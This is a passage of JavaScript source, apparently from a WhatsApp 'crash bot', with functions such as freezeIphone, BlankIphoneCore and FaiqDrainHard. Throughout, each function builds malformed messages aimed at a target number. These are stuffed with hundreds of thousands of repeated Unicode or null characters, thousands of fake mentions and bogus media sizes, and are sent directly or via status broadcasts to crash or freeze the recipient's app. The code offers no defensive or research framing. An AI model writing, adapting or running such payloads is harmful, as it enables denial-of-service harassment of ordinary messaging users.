                                    isAiSticker: false,
                                    isLottie: false,
                                    contextInfo: {
                                        mentionedJid: target
                                    }
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: '🩸Faiq Crash '
                            },
                            footer: {
                                text: '🩸Faiq Crash '
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "\n".repeat(10000)
                            },
                            contextInfo: {
                                id: sock.generateMessageTag(),
                                forwardingScore: 999,
                                isForwarding: true,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "X",
                                mentionedJid: ["0@s.whatsapp.net"]
                            }
                        }]
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, ZayCoreX, {
        messageId: null,
        participant: { jid: target },
        userJid: target
    });

    await sock.sendNode(expensionNode);
}

async function Evoblank(target) {
 const Msg1 = {
  interactiveMessage: {
     contextInfo: {
          stanzaId: "Evoblank.id" + Date.now(),
                isForwarding: true,
                   forwardingScore: 999,
                     participant: target,
                        remoteJid: "status@broadcast",
                        mentionedJid: [
                          "13333335502@s.whatsapp.net",
                            ...Array.from(
                            { length: 5 }, () => 
                        "1" + Math.floor(Math.random() * 5000000) + "13333335502@s.whatsapp.net",
                            ),
                        ],
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimeStamp: Date.now() + 18144000000,
                            },
                        },
                        forwardedAiBotMessageInfo: {
                            botName: "META AI",
                            botJid: Math.floor(Math.random() * 99999),
                            creatorName: "Evo engine",
                        },
                   hasMediaAttachment: false
               },
           },
     viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0.000000,
          degreesLongitude: 0.000000,
          name: "ꦽ".repeat(1500),
          address: "ꦽ".repeat(1000),
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: target,
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };
  await sock.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "./sock.js" + "𑜦𑜠".repeat(25000),
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: false,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "^𝗘𝘃𝗼 𝗘𝗻𝗴𝗶𝗻𝗲" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  "icon": "REVIEW",
                  "flow_cta": "𑜦𑜠".repeat(25000),
                  "flow_message_version": "3"
                })
              }
            ],
            messageParamsJson: "{",
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            forwardingScore: 999,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: " X ",
            stanzaId: "666",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          },
        },
      },
    },
  }, {
    participant: {
      jid: target
    }
  });
}
async function BlankAhh(sock, target) {

const selectedMedia = mediaData[sequentialIndex];

  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const MD_ID = selectedMedia.ID;
  const MD_Uri = selectedMedia.uri;
  const MD_Buffer = selectedMedia.buffer;
  const MD_SID = selectedMedia.sid;
  const MD_sha256 = selectedMedia.SHA256;
  const MD_encsha25 = selectedMedia.ENCSHA256;
  const mkey = selectedMedia.mkey;

  let parse = true;
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  
    let Jarr77 = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "ោ៝".repeat(10000),
    title: "kopi dangdut",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };
  
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
          fileSha256: MD_sha256,
          fileEncSha256: MD_encsha25,
          mediaKey: mkey,
          mimetype: type,
          directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };


  let tmsg = await generateWAMessageFromContent(target, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: Math.floor(Math.random() * 99999),
        forwardingScore: 9999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363401204661101@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(20000)
        },
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          )
        ],
        quotedMessage: {
           imageMessage: {
               url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
               mimetype: "image/jpeg",
               caption:"ោ៝".repeat(6000),
               fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
               fileLength: "19769",
               height: 354,
               width: 783,
               mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
               fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
               directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
               mediaKeyTimestamp: "1743225419",
               jpegThumbnail: null,
                scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                scanLengths: [2437, 17332],
                 contextInfo: {
                    isSampled: true,
                    participant: target,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9999,
                    isForwarded: true
                }
            }         
        },
        annotations: [
          {
            embeddedContent: { Jarr77 },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});
  const msg = generateWAMessageFromContent(target, message, {});
  const msgg = generateWAMessageFromContent(target, tmsg, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
 
  await sock.relayMessage("status@broadcast", msgg.message, {
    messageId: msgg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function DelayFcJarr(sock, target) {
  const msg1 = {
    botInvokeMessage: {
     message: {
      newsletterAdminInviteMessage: {
       newsletterJid: `33333333333333333@newsletter`,
   newsletterName: "𝑺𝒕𝒆𝒄𝒕𝒓𝒆-𝑿 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲" + "ꦾ".     repeat(15000),
    jpegThumbnail: "",
    caption: "ꦽ".repeat(100000) + "@0".repeat(100000),
   inviteExpiration: Date.now() + 1814400000, // 21 hari
      },
   },
},
   nativeFlowMessage: {
    messageParamsJson: "",
      buttons: [
{
   name: "call_permission_request",
   buttonParamsJson: "{}",
},
{
   name: "galaxy_message",
    paramsJson: {
     "screen_2_OptIn_0": true,
      "screen_2_OptIn_1": true,
       "screen_1_Dropdown_0": "nullOnTop",
        "screen_1_DatePicker_1": "1028995200000",
         "screen_1_TextInput_2": "null@gmail.com",
          "screen_1_TextInput_3": "94643116",
        "screen_0_TextInput_0": "\u0000".repeat(500000),
   "screen_0_TextInput_1": "SecretDocu",
     "screen_0_Dropdown_2": "#926-Xnull",
   "screen_0_RadioButtonsGroup_3": "0_true",
  "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
     },
    },
   ],
 },
   contextInfo: {
    mentionedJid: Array.from({ length: 5 }, () => "0@s.  whatsapp.net"),
  groupMentions: [
{
  groupJid: "0@s.whatsapp.net",
  groupSubject: "𝐃𝐞𝐦𝐞𝐧𝐭𝐨𝐫 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲",
   },
  ],
 },
};
  const msg2 = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "Stectre-X" + "\u0000".repeat(70000) + "𑇂𑆵𑆴𑆿".repeat(60000),
        url: "https://github.com/urz1ee",
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
              caption: "@JarrNotDev" + "𑇂𑆵𑆴𑆿".repeat(90000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg1.message, {
    messageId: msg1.key?.id || Math.random().toString(36).slice(2),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });

  await sock.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key?.id || Math.random().toString(36).slice(2),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });
}
async function FaiqDelaySpam(sock, target) {
  
  const YutaxTheOnlyOne = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };
  
  const YutaxTheOnlyTwo = {
    viewOnceMessage: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
          fileLength: "999999999999",
          pageCount: 1316134911,
          mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
          fileName: "Tes!!",
          fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
          directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc",
          mediaKeyTimestamp: "1743848703",
          caption: "ꦾ".repeat(180000),
          contextInfo: {
            remoteJid: target,
            fromMe: true,
            participant: target,
            mentionedJid: Array.from({ length: 2000 }, (_, i) => `1${i}@s.whatsapp.net`),
            groupMentions: [
              {
                groupJid: "628xxxxxx2345@g.us",
                groupSubject: "ꦾ".repeat(50000)
              }
            ],
            forwardingScore: 999
          }
        }
      }
    }
  };
  
  console.log(`Succes Sending FaiqDelaySpam To ${target}`);
}
async function FaiqDrainHard(sock, target) {

for (let i = 0; i < 500; i++) {
  const msg = {
    viewOnceMessage: {
      message: {
        imageMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
         mimetype: "image/jpeg",
         caption: nanay,
         fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
         fileLength: "99999999999999999999999",
         height: 999999999999999999999999,
         width: 999999999999999999999999,
         mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
         fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
         directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
         mediaKeyTimestamp: "1743225419",
         jpegThumbnail: null,
         scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
         scanLengths: [2437, 17332],
          contextInfo: {
           mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
           isSampled: true,
           participant: target,
           remoteJid: "status@broadcast",
           forwardingScore: 9741,
           isForwarded: true
          }
        }
      }
    }
  };
}

let msg = { 
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/540333979_2660244380983043_2025707384462578704_n.enc?ccb=11-4&oh=01_Q5Aa3AH58d8JlgVc6ErscnjG1Pyj7cT682cpI5AeJRCkGBE2Wg&oe=6934CBA0&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "QxkYuxM0qMDgqUK5WCi91bKWGFDoHhNNkrRlfMNEjTo=",
                    fileLength: "999999999999",
                    height: 999999999,
                    width: 999999999,
                    mediaKey: "prx9yPJPZEJ5aVgJnrpnHYCe8UzNZX6/QFESh0FTq+w=",
                    fileEncSha256: "zJgg0nMJT1uBohdzwDXkOxaRlQnhJZb+qzLF1lbLucc=",
                    directPath: "/v/t62.7118-24/540333979_2660244380983043_2025707384462578704_n.enc?ccb=11-4&oh=01_Q5Aa3AH58d8JlgVc6ErscnjG1Pyj7cT682cpI5AeJRCkGBE2Wg&oe=6934CBA0&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1762488513",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAIAMBIgACEQEDEQH/xAAtAAACAwEAAAAAAAAAAAAAAAAABAIDBQEBAQEBAAAAAAAAAAAAAAAAAAABEv/aAAwDAQACEAMQAAAAQgzOsuOtNHI6YZhpxRWpeubdXLKhm1ckeEqlp6CS4B//xAAkEAACAwABAwQDAQAAAAAAAAABAgADEQQSFEETMUFREDJCUv/aAAgBAQABPwDtVC4riLw6zvU8bitpzI1Tge0FQW1ARgjUKOSVzwZZxwjosoqSpQp8ndyXUNYQ31DxrS4eNxrGsDmcjju7KyjzD+G8TcG7H5PSPE7m2dwzIwM63/1P3c/QlrqkqAdfqehn9CLfWPacy0m3QYrM1S4fM67x8iBg3zkZAf6muAMMc2fJgvOZk9YzuW9sh5BzMn//xAAXEQEBAQEAAAAAAAAAAAAAAAARAAEg/9oACAECAQE/ACJmLNOf/8QAGREBAQADAQAAAAAAAAAAAAAAAREAAhBC/9oACAEDAQE/ADaNg5cdVJZhqnpeJeV7/9k=",
                    caption: "ꦾ".repeat(20000) + "ꦾ".repeat(40000),  
                    contextInfo: {
                        mentionedJid: [
                            ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 5000000) + "917267@s.whatsapp.net"),
                        ],
                        remoteJid: "status@broadcast",
                        isForwarded: true,
                        forwadingScore: 999,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "696969696969@newsletter",
                            serverMessageId: 1,
                            newsletterName: "YUTAXxX",
                        }
                    }
                }
            }
        }
    };
  
  const msg1 = generateWAMessageFromContent(target, msg.message, {});
  
  await sock.relayMessage("status@broadcast", msg1.message, {
    messageId: msg1.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function eventFlowres(target) {
    await sock.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        messageSecret: crypto.randomBytes(32)
                    },
                    eventMessage: {
                        isCanceled: false,
                        name: "‼️⃟   ༚Ꮡ‌‌ ⭑‌ ⟅  𝚲𝐏‌𝐏𝚯𝐋‌𝚯݉ ، ▾ ► 𝚵𝐗‌𝐏𝐋𝚫‌𝐍𝚫𝐓‌𝚰𝚯𝚴‌𝚾  ◄ ⟆ ⭑‌",
                        description: "-you're not alone\nthere is more to this, I know\nyou can make it out\nyou will live to tell",
                        location: {
                            degreesLatitude: "a",
                            degreesLongitude: "a",
                            name: "X"
                        },
                        joinLink: "https://call.whatsapp.com/voice/wrZ273EsqE7NGlJ8UT0rtZ",
                        startTime: "1714957200",
                        thumbnailDirectPath: "https://files.catbox.moe/6hu21j.jpg",
                        thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
                        thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
                        mediaKey: Buffer.from('abcdef1234567890abcdef1234567890', 'hex'),
                        mediaKeyTimestamp: Date.now(),
                        contextInfo: {
                            mentions: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@.s.whatsapp.net"),
                            remoteJid: "status@broadcast",
                            participant: "0@s.whatsapp.net",
                            fromMe: false,
                            isForwarded: true,
                            forwardingScore: 9999,
                            forwardedNewsletterMessageInfo: {
                              newsletterJid: "120363422445860082@newsletter",
                              serverMessageId: 1,
                              newsletterName: "┃► #fvcker 🩸"
                            },
                            quotedMessage: {
                                interactiveResponseMessage: {
                                    body: {
                                        text: "wtf - MsG",
                                        format: "DEFAULT"
                                    },
                                    nativeFlowResponseMessage: {
                                        name: 'address_message',
                                        paramsJson: "\x10".repeat(1000000),
                                        version: 3
                                    }
                                }
                            }
                        }
                    }
                }
            }
        },
        {
            ephemeralExpiration: 5,
            timeStamp: Date.now()
        }
    );
}

async function FaiqDelayInvisHard(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "𝗬𝗧𝗫 - 𝗬𝗨𝗧𝗔𝗫 𝗜𝗡 𝗛𝗘𝗥𝗘 ¿¡¡?",
                    contentText:
                        "𝗬𝗧𝗫 - 𝗬𝗨𝗧𝗔𝗫 𝗜𝗡 𝗛𝗘𝗥𝗘 ¿¡¡?",
                    footerText: "𝗬𝗧𝗫 - 𝗬𝗨𝗧𝗔𝗫 𝗜𝗡 𝗛𝗘𝗥𝗘 ¿¡¡?�?",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "𝗬𝗧𝗫 - 𝗬𝗨𝗧𝗔𝗫 𝗜𝗡 𝗛𝗘𝗥𝗘 ¿¡¡?" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "InvisHarder" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
        
async function freezeIphone(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "GHOST PRIDE 🩸" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 9999999471,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
async function BlankIphoneCore(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "GHOST PRIDE 🩸" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await sock.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}

async function iosnew(sock, target) {
  const AddressPayload = {
    locationMessage: {
      degreesLatitude: 1999-1999917739,
      degreesLongitude: -11.81992828899,
      name: " ⎋꙱" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://eporner.com",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "Join New Group" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "1s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  };

  await sock.relayMessage(target, AddressPayload, {
    participant: { jid: target }
  });
}

async function FaiqBeta(target, mention) {
  const generateMentions = (count = 1900) => {
    return [
      "0@s.whatsapp.net",
      ...Array.from({ length: count }, () =>
        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      )
    ];
  };

  let mentionList = generateMentions(1900);
  let aksara = "ꦀ".repeat(3000) + "\n" + "ꦂ‎".repeat(3000);
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;

  if (11 > 9) {
    parse = parse ? false : true;
  }

  const X = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".Floid" + "ោ៝".repeat(10000),
    title: "Sow",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const tmsg = await generateWAMessageFromContent(target, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "Floid-Id" + Math.floor(Math.random() * 99999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(10000)
        },
        mentionedJid: mentionList,
        quotedMessage: {
          callLogMesssage: {
            isVideo: true,
            callOutcome: "1",
            durationSecs: "0",
            callType: "REGULAR",
            participants: [{
              jid: "5521992999999@s.whatsapp.net",
              callOutcome: "1"
            }]
          },
          viewOnceMessage: {
            message: {
              stickerMessage: {
                url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
                fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                mimetype: type,
                directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                fileLength: {
                  low: Math.floor(Math.random() * 200000000),
                  high: 0,
                  unsigned: true
                },
                mediaKeyTimestamp: {
                  low: Math.floor(Math.random() * 1700000000),
                  high: 0,
                  unsigned: false
                },
                firstFrameLength: 19904,
                firstFrameSidecar: "KN4kQ5pyABRAgA==",
                isAnimated: true,
                stickerSentTs: {
                  low: Math.floor(Math.random() * -20000000),
                  high: 555,
                  unsigned: parse
                },
                isAvatar: parse,
                isAiSticker: parse,
                isLottie: parse
              }
            }
          },
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            caption: `</> Amelia Is Back!!! - ${aksara}`,
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "19769",
            height: 354,
            width: 783,
